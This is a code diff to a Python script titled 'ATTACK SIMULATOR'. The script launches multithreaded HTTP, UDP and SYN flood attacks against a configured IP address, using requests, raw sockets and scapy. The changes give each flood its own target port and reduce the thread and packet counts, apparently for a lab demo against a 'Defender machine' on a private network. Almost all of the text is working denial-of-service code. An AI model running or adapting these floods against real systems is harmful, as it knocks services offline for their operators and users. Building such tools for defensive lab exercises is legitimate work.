@@ -9,22 +9,28 @@ from scapy.all import IP, TCP, UDP, send
 # CONFIG
 # ==========================
 TARGET_IP = "192.168.1.4"   # Defender machine IP
-TARGET_PORT = 5001          # Victim service port
-ATTACK_THREADS = 50         # More stable on Windows
-PACKETS_PER_THREAD = 5000   # Reliable without freezing system
+TARGET_PORTS = {
+    "http": 5000,
+    "udp": 5001,
+    "syn": 8081,
+}
+
+# Smaller defaults make the demo finish quickly and consistently
+ATTACK_THREADS = 10
+PACKETS_PER_THREAD = 500
 
 HTTP_TIMEOUT = 0.1
 
 # ==========================
 # HTTP FLOOD ATTACK
 # ==========================
-def http_flood():
+def http_flood(target_port):
     session = requests.Session()
 
     for _ in range(PACKETS_PER_THREAD):
         try:
             session.get(
-                f"http://{TARGET_IP}:{TARGET_PORT}",
+                f"http://{TARGET_IP}:{target_port}",
                 timeout=HTTP_TIMEOUT
             )
         except:
@@ -33,14 +39,14 @@ def http_flood():
 # ==========================
 # UDP FLOOD ATTACK
 # ==========================
-def udp_flood():
+def udp_flood(target_port):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
     payload = random._urandom(1024)
 
     for _ in range(PACKETS_PER_THREAD):
         try:
-            sock.sendto(payload, (TARGET_IP, TARGET_PORT))
+            sock.sendto(payload, (TARGET_IP, target_port))
         except:
             pass
 
@@ -49,7 +55,7 @@ def udp_flood():
 # ==========================
 # SYN FLOOD ATTACK
 # ==========================
-def syn_flood():
+def syn_flood(target_port):
     for _ in range(PACKETS_PER_THREAD):
         try:
             src_port = random.randint(1024, 65535)
@@ -58,7 +64,7 @@ def syn_flood():
                 IP(dst=TARGET_IP) /
                 TCP(
                     sport=src_port,
-                    dport=TARGET_PORT,
+                    dport=target_port,
                     flags="S"
                 )
             )
@@ -91,9 +97,11 @@ def run_attack(attack_type):
         print("Invalid attack type.")
         return
 
+    target_port = TARGET_PORTS[attack_type]
+
     print(f"\nStarting {attack_type.upper()} flood attack...")
     print(
-        f"Target: {TARGET_IP}:{TARGET_PORT} | "
+        f"Target: {TARGET_IP}:{target_port} | "
         f"Threads: {ATTACK_THREADS} | "
         f"Packets/thread: {PACKETS_PER_THREAD}"
     )
@@ -103,6 +111,7 @@ def run_attack(attack_type):
     for _ in range(ATTACK_THREADS):
         t = threading.Thread(
             target=attack_func,
+            args=(target_port,),
             daemon=True
         )
 
@@ -131,7 +140,9 @@ def run_attack(attack_type):
 if __name__ == "__main__":
     print("==== ATTACK SIMULATOR ====")
     print(f"Target IP: {TARGET_IP}")
-    print(f"Target Port: {TARGET_PORT}")
+    print(f"HTTP Port: {TARGET_PORTS['http']}")
+    print(f"UDP Port: {TARGET_PORTS['udp']}")
+    print(f"SYN Port: {TARGET_PORTS['syn']}")
     print("")
     print("1. HTTP Flood")
     print("2. UDP Flood")
